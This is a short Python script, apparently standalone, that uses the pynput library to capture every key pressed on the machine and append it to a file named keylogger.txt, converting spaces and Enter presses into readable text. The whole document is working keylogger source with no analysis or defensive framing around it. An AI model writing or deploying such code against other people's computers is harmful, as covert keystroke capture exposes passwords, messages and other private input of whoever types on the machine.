from pynput.keyboard import Listener

def log_keystroke(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == "Key.enter":
        key = '\n'

    with open("keylogger.txt", 'a') as f:
        f.write(key)

with Listener(on_press=log_keystroke) as listener:
    listener.join()